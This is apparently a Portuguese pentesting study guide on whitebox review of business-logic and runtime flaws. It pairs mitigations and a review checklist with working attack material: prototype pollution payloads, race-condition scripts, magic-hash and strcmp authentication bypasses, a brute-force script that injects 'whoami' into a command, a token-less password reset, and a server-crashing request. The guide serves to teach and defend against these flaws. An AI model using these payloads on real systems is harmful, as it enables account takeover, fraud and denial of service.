---
title: "Whitebox Pentesting — Advanced"
---

# Whitebox Avancado: Prototype Pollution, Race Conditions, Type Juggling e Logic Bugs

## Contexto: Vulnerabilidades de Logica de Negocio - Onde Ferramentas Automaticas Falham

Prototype pollution, race conditions, type juggling e logic bugs compartilham uma caracteristica critica: ferramentas automaticas de SAST nao conseguem detecta-las de forma confiavel, porque para identifica-las e necessario entender *o que a aplicacao deveria fazer* - nao apenas como o codigo esta escrito.

**Por que logica de negocio tem o maior impacto:**

Falhas de logica de negocio geralmente sao as de maior impacto para a empresa porque envolvem toda uma cadeia de negocio definida que e dificil de alterar. Quando uma vulnerabilidade esta na logica de devolucao de produto - por exemplo, o sistema nao verifica se o valor devolvido e o mesmo do valor original da compra - corrigir isso nao e so mudar o codigo: e redesenhar o fluxo de negocio, a logistica, e os mecanismos de controle que o preveem. O impacto de exploracao e imediato (prejuizo financeiro direto), e o custo de correcao e alto.

Um exemplo concreto: ao interceptar uma requisicao de devolucao e modificar o campo `quantity` para 1000, o sistema devolve creditos correspondentes a 1000 unidades de um produto que custou apenas 10. O backend aceitou a quantidade arbitraria sem validar se ela correspondia a quantidade original do pedido.

**Por que cada vulnerabilidade tem causa raiz diferente:**

| Vulnerabilidade | Causa Raiz Real | Por que SAST nao detecta |
|---|---|---|
| Prototype Pollution | JavaScript heranca por referencia - `__proto__` modifica o prototipo global | SAST detecta `merge()` mas nao sabe se keys vem de input do usuario |
| Race Condition (TOCTOU) | Separacao temporal entre verificacao e uso - janela de concorrencia | Requer analise de fluxo de execucao paralela, nao de codigo linear |
| Type Juggling | Comparacao `==` converte tipos - `0 == "qualquer_hash"` e `true` | SAST aponta `==` mas nao sabe se o contexto e autenticacao critica |
| Null Safety | Condicao `&&` em JavaScript faz short-circuit - `null && x` retorna `null` sem avaliar `x` | Requer rastreamento de fluxo de dados e entendimento da intencao do codigo |
| Logic Disparity | Frontend valida, backend assume que frontend validou - dois pontos de verdade | Requer entendimento de que existe validacao ausente, nao codigo errado |

**Security Code Review na pratica - CVE-2023-28838:**

O processo correto de investigacao de dependencia vulneravel — ilustrado pelo CVE-2023-28838 — A aplicacao usa uma biblioteca de deserializacao de objetos Python para serializar e deserializar objetos de carrinho de compras. Um scanner SAST apontaria o risco de deserializacao insegura. Mas isso e apenas o ponto de partida, nao a conclusao.

A investigacao manual mostra que a funcao de deserializacao esta sendo chamada na rota `generate_cart` recebendo `cartData` diretamente da requisicao - ou seja, o usuario controla o dado que chega ao sink de deserializacao insegura. Isso confirma exploitabilidade. O ponto critico: sem assinatura criptografica do objeto serializado, qualquer dado que o usuario forneca como `cartData` sera deserializado - permitindo injecao de payload para RCE.

Conclusao: presenca de biblioteca de deserializacao != vulnerabilidade. Presenca de deserializacao de dado controlado pelo usuario = vulnerabilidade confirmada. Code review manual e o que distingue os dois casos.

**OWASP SAMM - Seguranca incorporada no SDLC:**

O OWASP SAMM (Software Assurance Maturity Model) e um framework para medir e melhorar a maturidade de seguranca de uma organizacao ao longo de cinco pilares:

- **Governanca**: estrategias, metricas, politicas de seguranca, treinamento de desenvolvedores
- **Design**: modelagem de ameacas, requisitos de seguranca derivados de riscos, arquitetura segura desde o inicio
- **Implementacao**: seguranca no build (scans automatizados), seguranca no deploy, gerenciamento de defeitos com SLA por criticidade
- **Verificacao**: avaliacao de arquitetura recorrente, testes de seguranca integrados ao CI/CD
- **Operacoes**: monitoramento, resposta a incidentes, gerenciamento de vulnerabilidades em producao

Para o pentester/code reviewer, o SAMM serve como diagnostico: quando uma organizacao nao tem modelagem de ameacas (pilar Design) e nao tem scans no pipeline (pilar Implementacao), vulnerabilidades de logica de negocio chegam a producao porque nenhum processo as detectaria antes.

**Whitebox avancado oferece acesso a classes de bug invisiveis no blackbox:**

- **Race conditions**: identificaveis no codigo como padrao check-then-use sem lock atomico - no blackbox dependem de timing exato
- **Prototype pollution**: identificavel via `merge()` sem filtro de keys perigosas - no blackbox requer fuzzing extensivo
- **Type juggling**: grep por `==` em contextos de autenticacao revela o padrao - no blackbox e necessario tentar cada payload possivel
- **Null safety**: rastreamento de variaveis nao inicializadas usadas em condicoes - invisivel no blackbox sem conhecer a estrutura interna

---

## Taxonomia das Vulnerabilidades de Lógica e Runtime

### Visao Geral das Vulnerabilidades

| Vulnerabilidade | Causa Raiz | Impacto Tipico |
|---|---|---|
| Prototype Pollution | merge() inseguro com chaves do usuario | Privilege escalation, RCE |
| Race Condition (TOCTOU) | Check-then-use sem locks atomicos | Uso duplo de recursos unicos |
| Type Juggling | Comparacoes fracas (==) em PHP/JS | Bypass de autenticacao |
| Null Safety | Variaveis nao inicializadas usadas | DoS, bypass de controles |
| Logic Disparity | Frontend valida, backend nao revalida | Compras invalidas, reservas duplas |
| Unexpected Input | Tipo errado aceito por schema fraco | Precos negativos, corrupcao de DB |

---

## Na Pratica

### 1. Prototype Pollution

#### Como Funciona

```javascript
// O prototype chain do JavaScript:
// Todo objeto herda de Object.prototype
// Poluindo Object.prototype, TODOS os objetos sao afetados

let obj = {};
console.log(obj.admin);     // undefined (normal)

// Poluicao via __proto__
obj.__proto__.admin = true;

let novoObj = {};
console.log(novoObj.admin); // true (POLUIDO!)
```

#### Funcao merge() Vulneravel

```javascript
// Merge recursivo SEM verificar se key e "__proto__"
function merge(target, source) {
    for (let key in source) {
        if (isObject(target[key]) && isObject(source[key])) {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];  // chave pode ser __proto__!
        }
    }
    return target;
}

// Payload de ataque via JSON
const payload = JSON.parse('{"__proto__": {"admin": true}}');
merge({}, payload);
// Agora QUALQUER objeto tem .admin == true
```

#### Escalada de Privilegio

```javascript
// Verificacao de admin que usa propriedade do prototype
app.get('/admin', (req, res) => {
    if (req.user.isAdmin) {
        // req.user.isAdmin nao existe no objeto
        // mas existe em Object.prototype se poluido!
        return res.json({ flag: 'ADMIN_PANEL' });
    }
    res.status(403).json({ error: 'Not admin' });
});

// Poluir via endpoint vulneravel:
// POST /api/settings
// Body: {"__proto__": {"isAdmin": true}}
```

#### Bypass do filtro __proto__ com constructor[prototype]

```javascript
// Quando __proto__ e filtrado:
if (key === '__proto__') continue;  // filtro basico

// Bypass usando constructor[prototype]:
const payload = JSON.parse('{"constructor": {"prototype": {"admin": true}}}');
merge({}, payload);
// Funciona! constructor.prototype === __proto__
```

#### DOM Invader (Prototype Pollution no Frontend)

```
No Burp Suite Browser:
1. Abrir DOM Invader (icone no DevTools)
2. Ativar "Prototype pollution" scan
3. Navegar pela aplicacao
4. DOM Invader detecta automaticamente gadgets de PP

Manualmente no console:
Object.prototype.test = 'DOM_INVADER_PP_TEST'
// Se elemento da pagina mostrar esse valor, ha gadget de PP
```

---

### 2. Race Conditions (TOCTOU)

#### Vulnerabilidade Classica: Gift Card

```php
// TOCTOU - Time of Check Time of Use
function redeem_gift_card($username, $code) {
    $gift_card_balance = check_gift_card_balance($code);  // CHECK
    if ($gift_card_balance === 0) { return "Invalid!"; }

    $user = fetch_user_data($username);
    $new_balance = $user['balance'] + $gift_card_balance;
    update_user_balance($username, $new_balance);          // USE
    invalidate_gift_card($code);                           // INVALIDACAO TARDIA!
    return "Success!";
}
// Janela de race: entre check_balance e invalidate_gift_card
// 2 requisicoes simultaneas passam pela verificacao antes da invalidacao
```

#### PHP Session Locks

```php
// PHP com session_start() serializa requests do MESMO usuario
// Para explorar race condition em PHP: usar SESSOES DIFERENTES
// Criar 2 contas e disparar requests simultaneos com sessoes distintas
```

#### Exploracao com Burp Turbo Intruder

```python
# race.py para Burp Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)

    # Usar gate para sincronizar todos os requests
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Disparar todos simultaneamente
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

```bash
# Alternativa: curl paralelo para race condition simples
for i in {1..20}; do
    curl -X POST http://TARGET/api/redeem \
         -H "Authorization: Bearer TOKEN" \
         -d '{"code":"GIFT123"}' &
done
wait
```

#### Fix para Race Condition (SQL LOCK TABLES)

```sql
-- Solucao: transacao atomica com lock
LOCK TABLES active_gift_cards WRITE, users WRITE;

START TRANSACTION;
    SELECT balance FROM active_gift_cards WHERE code = 'GIFT123' FOR UPDATE;
    UPDATE users SET balance = balance + 50 WHERE username = 'alice';
    DELETE FROM active_gift_cards WHERE code = 'GIFT123';
COMMIT;

UNLOCK TABLES;
```

#### Timing Attack para Enumeracao de Usuarios

```bash
# bcrypt leva ~187ms para usuario existente, ~3ms para inexistente

for user in admin root test user1 operator; do
    TIME_START=$(date +%s%N)
    curl -s -X POST http://TARGET/api/login \
         -d "{\"email\":\"$user@target.com\",\"password\":\"wrongpass\"}" \
         -o /dev/null
    TIME_END=$(date +%s%N)
    ELAPSED=$(( (TIME_END - TIME_START) / 1000000 ))
    echo "$user: ${ELAPSED}ms"
done
# admin: 189ms  <- USUARIO EXISTE!
# root:  4ms    <- nao existe
# test:  187ms  <- USUARIO EXISTE!
```

---

### 3. Type Juggling (PHP)

#### Comparacao Fraca vs Estrita

```php
// FRACA (==): compara valores apos conversao de tipo
0 == "foobar"   // TRUE! string que nao comeca com numero vira 0
0 == ""         // TRUE!
0 == null       // TRUE!
0 == false      // TRUE!

// ESTRITA (===): compara valores E tipos
0 === "foobar"  // FALSE
0 === ""        // FALSE

// PERIGO em autenticacao:
if ($data['password'] == $user['password']) {  // VULNERAVEL!
    // Se password do BD nao comeca com numero: 0 == qualquer_hash = true
    login_user();
}
```

#### Magic Hashes

```
Hashes que comecam com "0e" seguido de apenas digitos sao
interpretados como notacao cientifica: 0e12345 = 0 * 10^12345 = 0

Hashes MD5 magicos conhecidos:
240610708  -> 0e462097431906509019562988736854
QNKCDZO    -> 0e830400451993494058024219903391
0e1137126  -> 0e291659922323405260514745084877

SHA1 magicos:
aaroZmOk   -> 0e66507019969427134894567494305185566735

Payload: enviar "240610708" como senha
MD5("240610708") = "0e462097431906509019562988736854"
0e4... == 0 (comparacao fraca) -> 0 == 0 -> TRUE -> bypass!
```

#### Bypass via JSON (password: 0)

```bash
# Aplicacao PHP com comparacao fraca
# Se o hash do usuario nao comeca com numero, 0 == hash e TRUE!

curl -X POST http://TARGET/api/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": 0}'

# Funciona quando o codigo PHP faz:
# if ($data['password'] == $user['password_hash'])
# 0 == "$2y$10$..." -> TRUE (bcrypt nao comeca com numero)
```

#### strcmp() Bypass com Array

```php
// strcmp() retorna NULL se argumento nao e string
// NULL == 0 e TRUE em comparacao fraca!

if (strcmp($_POST['password'], $stored_password) == 0) {  // VULNERAVEL
    login_user();
}

// Bypass: enviar password como array
// POST: password[]=qualquer_coisa
// strcmp(array, string) -> NULL
// NULL == 0 -> TRUE -> login!
```

---

### 4. HMAC Type Juggling + Command Injection

```php
// Codigo vulneravel em hmac.php
function custom_hmac($dir, $nonce) {
    $key = file_get_contents("/hmackey.txt");
    $length = 10;
    $mac = substr(hash_hmac('md5', "{$dir}||{$nonce}", $key), 0, $length);
    return $mac;
}

function check_hmac($dir, $nonce, $mac) {
    return $mac == custom_hmac($dir, $nonce);  // == FRACO!
}

// Endpoint executa $dir via sistema sem sanitizacao
// dir="/home/user/; whoami" => command injection!
```

#### Script Python para Brute Force de Nonce

```python
import requests

URL = "http://127.0.0.1:8000/dir.php"
COOKIES = {"PHPSESSID": "seuphpsessidaqui"}
DIR = "/home/htb-stdnt/; whoami"  # Command injection no parametro dir
MAC = 0                            # 0 bypassara via type juggling
MAX_NONCE = 20000

def prepare_params(nonce):
    return {"dir": DIR, "nonce": nonce, "mac": MAC}

def make_request(nonce):
    return requests.get(URL, cookies=COOKIES, params=prepare_params(nonce))

# Brute force: nonce que produz MAC iniciando com "0e" + digitos
# mac=0 bypassara verificacao (0 == "0e..." == 0)
for n in range(MAX_NONCE):
    r = make_request(n)
    if "Error! Invalid MAC" not in r.text:
        print(f"[+] Nonce valido: {n}")
        print(f"[+] URL: {r.url}")
        print(f"[+] Output: {r.text[:500]}")
        break
    if n % 1000 == 0:
        print(f"[*] Progresso: {n}/{MAX_NONCE}")
```

---

### 5. Logic Bugs - Parameter Manipulation

#### Validation Logic Disparity

```javascript
// Frontend valida: datas desabilitadas no calendario
// Backend (bookExam) NAO valida disponibilidade da data

const updateReq = await UserExam.findOneAndUpdate(
    {
        examId: exam.id,
        userId,
        used: false,
        date: { $eq: null },  // so reserva se ainda nao reservado
    },
    {
        date: new Date(date),  // Aceita QUALQUER data, mesmo passada!
    }
);

// Prova de conceito: reservar data ja ocupada
curl -X POST http://TARGET/api/exams/book \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"id": 1, "date": "2023-09-14T23:00:00.000Z"}'
// Sucesso mesmo com todas as vagas preenchidas!
```

#### Unexpected Input - Valor Negativo

```javascript
// CartItemSchema vulneravel
const CartItemSchema = yup.object({
    name: yup.string().required(),
    category: yup.mixed().oneOf(["subscription", "exam", "cubes"]).required(),
    price: yup.number().required(),  // SEM .positive() SEM .min(1)
    amount: yup.number().required(), // SEM .positive() SEM .min(1)
});

// Exploracao: amount negativo cancela o preco total
// Comprar 100 cubos (amount: 1) custa $10
// Adicionar item identico com amount: -1 subtrai $10
// Total final: $0
curl -X POST http://TARGET/api/payment/charge \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "cardId": "SEU_CARD_ID",
       "items": [
         {"name": "100", "category": "cubes", "price": 0, "amount": 1},
         {"name": "100", "category": "cubes", "price": 0, "amount": -1}
       ]
     }'
// Resposta: "Successfully processed payment for a total of $0."
// 100 cubos gratis!
```

#### Null Safety - Reset de Senha sem Token

```javascript
// VULNERAVEL: verifica token SOMENTE se token existe
if (token && token !== hashedToken) {
    return next({ message: "Invalid token.", statusCode: 403 });
}
// Se token = null/undefined: (null && ...) = false = SEM verificacao!
// Prossegue para resetar a senha sem validar!

// Prova de conceito: resetar senha conhecendo apenas o ID
curl -X POST http://TARGET/api/users/password/reset \
     -H "Content-Type: application/json" \
     -d '{"id": "649f2893cba8d0d6e8412182", "password": "novaSenha123"}'
// Resposta: "Password updated successfully!"
// Account takeover sem token!
```

#### DoS via Null Safety (bcrypt com null)

```bash
# Remover o parametro password da requisicao de reset
# bcrypt.hash(null, salt) sem try/catch -> crash do servidor inteiro!

curl -X POST http://TARGET/api/users/password/reset \
     -H "Content-Type: application/json" \
     -d '{"id": "649f2893cba8d0d6e8412182"}'
# Sem campo password -> bcrypt recebe null -> crash sem resposta
# Servidor fica offline para todos os usuarios!
```

---

## Ferramentas

| Ferramenta | Uso Especifico | Onde Obter |
|---|---|---|
| **Burp Turbo Intruder** | Race conditions | Burp Suite BApp Store |
| **DOM Invader** | Prototype pollution frontend | Burp Suite Browser |
| **Semgrep** | Detectar patterns vulneraveis | semgrep.dev |
| **nodejsscan** | Scan especifico Node.js | `pip3 install nodejsscan` |
| **retire.js** | Deps vulneraveis no browser | `npm install -g retire` |

---

## Deteccao

### Padroes Criticos por Vulnerabilidade

| Vulnerabilidade | Pattern no Codigo | Fix |
|---|---|---|
| Prototype Pollution | `merge(obj, input)` sem whitelist de keys | Checar `key === '__proto__'` e `key === 'constructor'` |
| Race Condition | Check sem lock + uso posterior | Transacao atomica / DB lock |
| Type Juggling Auth | `== 0` ou `==` com hash | Usar `===` estrito |
| Magic Hash | `md5(input) == stored` fraco | `hash_equals()` + comparacao estrita |
| Null Bypass | `if (token && token !== x)` | Checar null explicitamente ANTES |
| Logic Disparity | Validacao so no frontend | Revalidar no backend SEMPRE |
| Unexpected Input | Schema sem `.positive().min(1)` | Adicionar constraints ao schema |

### Resumo de Mitigacoes

```javascript
// Prototype Pollution - merge seguro
function merge(target, source) {
    for (let key in source) {
        // BLOQUEAR keys perigosas
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;
        }
        if (isObject(target[key]) && isObject(source[key])) {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Null safety - padrao correto
// ERRADO: if (token && token !== hashedToken)
// CERTO: verificar null E undefined explicitamente
if (token === null || token === undefined) {
    return next({ message: "Token required", statusCode: 403 });
}
if (token !== hashedToken) {
    return next({ message: "Invalid token", statusCode: 403 });
}

// Schema com validacao correta
const CartItemSchema = yup.object({
    name: yup.string().required(),
    price: yup.number().positive().min(1).required(),
    amount: yup.number().positive().min(1).required(),
});

// Adicionar verificacao de array antes de iterar
if (!Array.isArray(items)) {
    return next({ message: "Items must be an array", statusCode: 400 });
}
```

### Checklist de Code Review - Logica de Negocio

```
PROTOTYPE POLLUTION:
[ ] Funcoes merge/extend/clone recebem input do usuario?
[ ] Keys __proto__, constructor, prototype sao filtradas?
[ ] Object.assign() ou spread com input do usuario?
[ ] lodash < 4.17.5 ou node.extend < 1.1.7 em uso?

RACE CONDITIONS:
[ ] Fluxos de credito/gift card/voucher tem lock atomico?
[ ] Operacoes check-then-use usam transacao de banco?
[ ] Recursos de uso unico (tokens) sao invalidados antes ou depois do uso?
[ ] Endpoints de alta sensibilidade foram testados com requisicoes simultaneas?

TYPE JUGGLING:
[ ] Comparacoes de hash/token usam === (estrito) ou ==?
[ ] strcmp(), hash_equals() com resultado comparado via == em PHP?
[ ] Input JSON pode enviar tipos diferentes do esperado (0 em vez de string)?
[ ] md5/sha1 com comparacao == - possivel magic hash?

NULL SAFETY:
[ ] Variaveis de request usadas antes de verificar se existem?
[ ] Condicoes de autenticacao usam && (short-circuit)?
[ ] Funcoes como bcrypt recebem null sem try/catch?
[ ] Schemas de validacao tem .required() em campos criticos?

LOGIC DISPARITY:
[ ] Validacoes de datas/disponibilidade existem no backend?
[ ] Campos de preco/quantidade tem .positive().min(1) no schema?
[ ] Fluxos de devolucao validam quantidade e valor originais?
[ ] Status de pedido pode ser alterado diretamente via API?

OWASP SAMM - Verificar presenca de:
[ ] Modelagem de ameacas para fluxos de negocio criticos (pilar Design)
[ ] Requisitos de seguranca derivados dos riscos mapeados (pilar Design)
[ ] Scans automatizados de seguranca no pipeline CI/CD (pilar Implementacao)
[ ] SLA definido para correcao de vulnerabilidades por criticidade (pilar Implementacao)
[ ] Avaliacao de arquitetura recorrente ao adicionar features (pilar Verificacao)
```
